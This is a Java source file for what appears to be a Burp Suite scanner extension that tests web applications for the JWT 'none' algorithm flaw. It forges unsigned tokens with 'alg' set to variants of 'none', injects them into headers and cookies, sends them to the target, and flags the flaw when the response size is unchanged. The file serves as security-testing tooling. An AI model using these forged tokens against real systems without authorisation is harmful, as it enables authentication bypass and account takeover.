package burp.core.scanner.active.jwtscanner;

import burp.*;
import burp.core.scanner.active.BaseActiveScanner;
import burp.core.scanner.active.IBaseScanner;
import burp.utils.BurpAnalyzedRequest;
import burp.utils.TimeOutput;
import com.alibaba.fastjson.JSONObject;
import com.auth0.jwt.algorithms.Algorithm;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

// CVE-2015-2951
public class JWTNoneWeakScanner extends BaseActiveScanner implements ActionListener, Runnable, IBaseScanner {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private BurpAnalyzedRequest burpAnalyzedRequest;
    private IHttpRequestResponse httpRequestResponse;
    private PrintWriter stdout;

    public JWTNoneWeakScanner(IBurpExtenderCallbacks callbacks, IHttpRequestResponse httpRequestResponse){
        super("JwtNoneScanner");
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.burpAnalyzedRequest = new BurpAnalyzedRequest();
        this.httpRequestResponse = httpRequestResponse;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
    }

    public List<String> getPayload(){
        // 拼接三种常用的NONE, None, none, nOne的none签名jwt形式
        List<String> checkJwtList = new ArrayList<String>();
        for (IJwtConstant.NoneFlag value : IJwtConstant.NoneFlag.values()) {
            MYJwt myJwt = new MYJwt(JWTUtils.verifyJwt(this.httpRequestResponse));
            JSONObject jsonObject = JSONObject.parseObject(myJwt.getHeaderJson());
            jsonObject.replace("alg", value);
            myJwt.setHeaderJson(jsonObject.toJSONString());
            String b64JwtHeader = myJwt.sign(Algorithm.none());
            checkJwtList.add(b64JwtHeader);
        }

        return checkJwtList;
    }

    /*
    * 构建四个数据包，进行发包处理
    * 1、haeders头需要处理
    * 2、cookie头需要处理
    * */
    public List<IHttpRequestResponse> sendPayload()  {
        List<IHttpRequestResponse> responseList = new ArrayList<>();
        List<String> unsignList = this.getPayload();

        IRequestInfo RequestInfo = this.helpers.analyzeRequest(this.httpRequestResponse);
        List<String> headers = RequestInfo.getHeaders();

        List<IParameter> parameters = burpAnalyzedRequest.getAllParamters(this.httpRequestResponse);

        for (String noneJwt : unsignList) {
            for (int i=0; i<headers.size(); i++) {
                String s = headers.get(i).replaceFirst(IJwtConstant.regexpJwtPattern, noneJwt);
                if (s.contains(noneJwt)){
                    headers.set(i, s);
                }
            }

            byte[] requestBytes = this.helpers.buildHttpMessage(headers, burpAnalyzedRequest.getRequestBody(this.httpRequestResponse));

            for (IParameter parameter : parameters) {
                String parameterName = parameter.getName();
                String parameterValue = parameter.getValue();
                String s = parameterValue.replaceFirst(IJwtConstant.regexpJwtPattern, noneJwt);
                if (!s.equals(parameterValue)){
                    IParameter targetParam = this.helpers.getRequestParameter(this.httpRequestResponse.getRequest(), parameterName);
                    IParameter iParameter = this.helpers.buildParameter(parameterName, s, IParameter.PARAM_COOKIE);
                    if (targetParam != null && targetParam.getType() == IParameter.PARAM_COOKIE){
                        requestBytes = this.helpers.updateParameter(requestBytes, iParameter);
                    }
                }
            }

            IHttpRequestResponse response = this.callbacks.makeHttpRequest(this.httpRequestResponse.getHttpService(), requestBytes);
            responseList.add(response);
        }

        return responseList;
    }

    /*
    * 构建Issue
    * */
    @Override
    public IScanIssue exportIssue(IHttpRequestResponse requestResponse){
        return new BurpScanIssue(
                requestResponse.getHttpService(),
                burpAnalyzedRequest.getUrl(requestResponse),
                new IHttpRequestResponse[] { requestResponse },
                "Jwt None Sign",
                "it can help us to get everyone.",
                "High");
    }

    /**
     * Invoked when an action occurs.
     *
     * @param e
     */
    @Override
    public void actionPerformed(ActionEvent e) {
        new Thread(this).start();
    }

    /**
     * When an object implementing interface <code>Runnable</code> is used
     * to create a thread, starting the thread causes the object's
     * <code>run</code> method to be called in that separately executing
     * thread.
     * <p>
     * The general contract of the method <code>run</code> is that it may
     * take any action whatsoever.
     *
     * @see Thread#run()
     */
    @Override
    public void run() {
        // 检查内容jwt
        if (!JWTUtils.getJwtFlag(this.httpRequestResponse)) {
            this.stdout.println(TimeOutput.formatOutput("未发现存在JWT字段"));
            return;
        }

        List<IHttpRequestResponse> responseList = null;
        try {
            responseList = this.sendPayload(); // 发送payload
        }catch (Exception e){
            e.printStackTrace();
        }

        if (responseList == null){
            return;
        }

        // 每次jwt检测一共四次
        for (IHttpRequestResponse response : responseList) {
            byte[] baseResponse = response.getResponse();

            // 默认添加请求包
            int tagId = BurpExtender.tags.add(
                    this.getScannerName(),
                    this.burpAnalyzedRequest.getRequestDomain(response),
                    this.helpers.analyzeResponse(baseResponse).getStatusCode() + "",
                    "[-] waiting for results",
                    this.httpRequestResponse
            );

            // 这里根据size的不同来进行判断jwt的none算法漏洞的存在性
            int responseSize = burpAnalyzedRequest.getResponseBodySize(response);
            if (responseSize != 0){
                // 正常的请求如下走法：
                // 判断大小是否一样，一样则是none存在
                int baseResponseSize = burpAnalyzedRequest.getResponseBodySize(this.httpRequestResponse);
                if (responseSize == baseResponseSize){
                    BurpExtender.tags.update(
                            tagId,
                            this.getScannerName(),
                            this.burpAnalyzedRequest.getRequestDomain(response),
                            burpAnalyzedRequest.getStatusCode(response)+"",
                            "[+] found jwt none",
                            response
                    );
//                        break;

                }else{
                    // 不一样则是none不存在，未检测出来问题也要更新任务状态至任务栏面板
                    BurpExtender.tags.update(
                            tagId,
                            this.getScannerName(),
                            this.burpAnalyzedRequest.getRequestDomain(response),
                            burpAnalyzedRequest.getStatusCode(response)+"",
                            "[-] not found jwt none",
                            response
                    );
                }
            }else{
                // 不正常的请求如下走法：
                BurpExtender.tags.update(
                        tagId,
                        this.getScannerName(),
                        this.burpAnalyzedRequest.getRequestDomain(response),
                        this.helpers.analyzeResponse(response.getResponse()).getStatusCode() + "",
                        "[-] JWTScan Something Wrong",
                        response
                );
            }
        }
    }
}
